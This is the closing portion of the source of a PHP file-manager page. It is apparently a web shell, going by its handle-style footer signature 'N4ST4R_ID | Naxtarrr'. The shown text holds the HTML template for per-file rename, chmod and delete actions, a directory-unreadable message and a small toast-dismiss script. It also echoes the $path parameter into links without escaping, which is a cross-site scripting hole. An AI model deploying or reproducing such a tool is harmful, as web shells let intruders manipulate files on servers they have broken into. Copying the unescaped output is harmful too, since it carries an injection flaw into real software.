                                            <path fill-rule="evenodd" d="M19.846 4.318a2.148 2.148 0 0 0-.437-.692 2.014 2.014 0 0 0-.654-.463 1.92 1.92 0 0 0-1.544 0 2.014 2.014 0 0 0-.654.463l-.546.578 2.852 3.02.546-.579a2.14 2.14 0 0 0 .437-.692 2.244 2.244 0 0 0 0-1.635ZM17.45 8.721 14.597 5.7 9.82 10.76a.54.54 0 0 0-.137.27l-.536 2.84c-.07.37.239.696.588.622l2.682-.567a.492.492 0 0 0 .255-.145l4.778-5.06Z" clip-rule="evenodd" />
                                        </svg>
                                    </a>
                                    <!-- File Rename Action -->
                                    <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=renamefile" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28" />
                                        </svg>
                                    </a>
                                    <!-- File Chmod Action -->
                                    <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=chmodfile" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 8v8m0-8h8M8 8H6a2 2 0 1 1 2-2v2Zm0 8h8m-8 0H6a2 2 0 1 0 2 2v-2Zm8 0V8m0 8h2a2 2 0 1 1-2 2v-2Zm0-8h2a2 2 0 1 0-2-2v2Z" />
                                        </svg>
                                    </a>
                                    <!-- File Delete Action -->
                                    <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=deletefile" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd" />
                                        </svg>
                                    </a>
                                </td>
                            </tr>
                        <?php } ?>
                    </tbody>
                <?php else: ?>
                    <span class="text-center text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">Directory Is NOT Readable</span>
                <?php endif; ?>
            </table>
        </div>

    </div>

    <span class="block text-center text-gray-700 uppercase dark:text-gray-400 my-5">N4ST4R_ID | Naxtarrr</span>

    <script>
        const closeToast = document.querySelector('[data-dismiss-target="#toast-default"]');
        if (closeToast) {
            closeToast.addEventListener('click', () => {
                const toast = document.getElementById('toast-default');
                if (toast) {
                    toast.classList.add('hidden');
                    <?php
                    if (isset($_SESSION["error"])) {
                        unset($_SESSION["error"]);
                    } elseif (isset($_SESSION["success"])) {
                        unset($_SESSION["success"]);
                    }
                    ?>
                }
            });
        }
    </script>
</body>

</html>
<?php ob_end_flush(); ?>